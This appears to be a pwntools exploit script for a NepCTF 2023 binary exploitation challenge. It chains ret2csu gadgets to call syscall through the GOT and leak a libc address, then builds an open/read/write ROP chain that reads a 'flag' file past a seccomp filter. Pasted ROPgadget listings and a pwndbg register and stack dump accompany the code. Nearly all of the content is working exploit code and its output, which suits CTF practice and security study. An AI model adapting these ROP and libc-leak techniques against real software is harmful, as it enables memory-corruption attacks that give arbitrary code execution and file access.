from pwn import *
context.arch='amd64'
context.log_level='debug'
power_rop1=0x0000000000400806
power_rop2=0x00000000004007F0
buf_inp=0x0000000000601039
pop_rbp=0x0000000000400628
bss_addr=0x0000000000601050
def getpower(avg1,avg2,avg3,got):
    payload=p64(power_rop1)+p64(0)+p64(0)+p64(1)+p64(got)+p64(avg1)+p64(avg2)+p64(avg3)
    payload+=p64(power_rop2)+p64(0)*7#为什么是7呢，因为虽然只有6个pop但是上面还有个rsp+8
    return payload

# p=process('./pwn')
p=process('../出题/pwn3/pwn')
# p=remote('162.14.104.152','10017')
# p=remote('nepctf.1cepeak.cn','31507')

elf=ELF('pwn')
libc=ELF('./libc-2.27.so')
syscall_got=elf.got['syscall']
seccomp_init_got=elf.symbols['seccomp_init']
# pause()
# gdb.attach(p,'b *0x000000000040078D')
# pause()


payload=b'flag\x00\x00\x00\x00'*(0x30//8)+p64(0x4007b0)
payload+=getpower(0,0,buf_inp,syscall_got)
# payload+=getpower(buf_inp,0,0,syscall_got)
payload+=getpower(1,1,syscall_got,syscall_got)
payload+=p64(pop_rbp)+p64(buf_inp+8)
# payload+=getpower(0,0,buf_inp+0x10,syscall_got)
# payload+=getpower(1,syscall_got,0x20,syscall_got)
# payload+=p64(elf.symbols['__libc_start_main'])
payload+=p64(0x000000000040076D)
# payload+=getpower(buf_inp,0,2,syscall_got)
# payload+=getpower(3,buf_inp+0x6,0x30,syscall_got)
# payload+=getpower(1,buf_inp+0x6,0x30,syscall_got)
p.sendlineafter(b'!!!\n',payload)
# p.sendlineafter(b'NepCTF2023!\n',payload)
pause()
p.sendline(b'flag\x00\x00\x00\x00'+p64(0x601000))
# pause()

# payload=b'a'*0x30+p64(0x4007b0)
# payload+=getpower(1,1,syscall_got,syscall_got)
# payload+=p64(0x000000000040076D)
# p.sendlineafter(b'NepCTF2023!\n',payload)


# pause()
# # p.sendline(b'')# 控制rax为1
# # # 接收libc
recvaddr=p.recvuntil(b'\x7f')
sysaddr=u64(recvaddr[-6:].ljust(8,b'\x00'))
print(hex(sysaddr))
libcbase=sysaddr-libc.symbols['syscall']
print('libcbase',hex(libcbase))

pop_rax=libcbase+0x000000000001b500
open_addr=libcbase+libc.symbols['open']
read_addr=libcbase+libc.symbols['read']
write_addr=libcbase+libc.symbols['write']
pop_rdi=0x0000000000400813
pop_rdx_rsi=libcbase+0x0000000000130539
pop_rsp=libcbase+0x000000000000396c
pop_rcx=libcbase+0x00000000000e433e

payload=b'flag\x00\x00\x00\x00'*(0x30//8)+p64(0x4007b0)
payload+=p64(pop_rax)+p64(2)+p64(pop_rcx)+p64(0)
# payload+=getpower(buf_inp,0,0,syscall_got)
payload+=flat([pop_rdi,buf_inp,pop_rdx_rsi,0,0,pop_rbp,buf_inp+0x30,sysaddr+23])
payload+=p64(pop_rax)+p64(0)
payload+=flat([pop_rdi,3,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])
payload+=p64(pop_rax)+p64(1)
payload+=flat([pop_rdi,1,pop_rdx_rsi,0x30,buf_inp,sysaddr+23])
# payload+=flat([pop_rdi,buf_inp-1,pop_rdx_rsi,0,0,open_addr])
# payload+=
payload+=p64(0x000000000040076D)
print('len',len(payload))
# p.sendlineafter(b'NepCTF2023!\n',payload)
p.sendlineafter(b'!!!\n',payload)

# # pop_rax=libcbase+0x000000000001b500
# # payload2=

p.interactive()
    #     orw_payload+=flat([pop_rdi,heap_addr+0x1c0,pop_rsi,0,open_addr])
    # orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,read_addr])
    # orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,write_addr])

'''
└─$ ROPgadget --binary ./pwn --only 'pop|ret'
Gadgets information
============================================================
0x000000000040080c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040080e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400810 : pop r14 ; pop r15 ; ret
0x0000000000400812 : pop r15 ; ret
0x000000000040080b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040080f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400628 : pop rbp ; ret
0x0000000000400813 : pop rdi ; ret
0x0000000000400811 : pop rsi ; pop r15 ; ret
0x000000000040080d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040056e : ret
0x0000000000400798 : ret 0xbe

'''

'''
└─$ ROPgadget --binary ./libc-2.27.so  --only 'pop|ret' | grep rax
0x000000000014ff27 : pop rax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000000213e1 : pop rax ; pop rbx ; pop rbp ; ret
0x0000000000166241 : pop rax ; pop rdx ; pop rbx ; ret
0x000000000001b500 : pop rax ; ret
0x00000000001cf8a8 : pop rax ; ret 0
'''

    # orw_payload+=flat([pop_rdi,heap_addr+0x1c0,pop_rsi,0,pop_rax,2,syscall])
    # orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,pop_rax,0,syscall])
    # orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x20,pop_rax,1,syscall])

'''
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────
*RAX  0x2
 RBX  0x0
*RCX  0x0
 RDX  0x0
*RDI  0x601039 (buf+25) ◂— 0x67616c662f2e /* './flag' */
 RSI  0x0
 R8   0x7f005d210b40 ◂— push rbp
 R9   0x0
 R10  0x7f005d210b40 ◂— push rbp
 R11  0x202
 R12  0x600fe8 (syscall@got[plt]) —▸ 0x7f005cf1b520 (syscall) ◂— mov rax, rdi
 R13  0x601039 (buf+25) ◂— 0x67616c662f2e /* './flag' */
 R14  0x0
 R15  0x0
 RBP  0x1
 RSP  0x7ffe00c39d60 ◂— 0x0
*RIP  0x4007f9 (__libc_csu_init+73) ◂— call qword ptr [r12 + rbx*8]
───────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
   0x400812 <__libc_csu_init+98>     pop    r15
   0x400814 <__libc_csu_init+100>    ret    
    ↓
   0x4007f0 <__libc_csu_init+64>     mov    rdx, r15
   0x4007f3 <__libc_csu_init+67>     mov    rsi, r14
   0x4007f6 <__libc_csu_init+70>     mov    edi, r13d
 ► 0x4007f9 <__libc_csu_init+73>     call   qword ptr [r12 + rbx*8]       <syscall>
        rdi: 0x601039 (buf+25) ◂— 0x67616c662f2e /* './flag' */
        rsi: 0x0
        rdx: 0x0
        rcx: 0x0
 
   0x4007fd <__libc_csu_init+77>     add    rbx, 1
   0x400801 <__libc_csu_init+81>     cmp    rbp, rbx
   0x400804 <__libc_csu_init+84>     jne    __libc_csu_init+64                      <__libc_csu_init+64>
 
   0x400806 <__libc_csu_init+86>     add    rsp, 8
   0x40080a <__libc_csu_init+90>     pop    rbx
─────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ rsp 0x7ffe00c39d60 ◂— 0x0
... ↓        6 skipped
07:0038│     0x7ffe00c39d98 —▸ 0x400806 (__libc_csu_init+86) ◂— add rsp, 8
───────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
 ► f 0         0x4007f9 __libc_csu_init+73
   f 1         0x400806 __libc_csu_init+86
   f 2         0x4007f0 __libc_csu_init+64
   f 3         0x400628 deregister_tm_clones+40
   f 4         0x40076d main+18
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> '''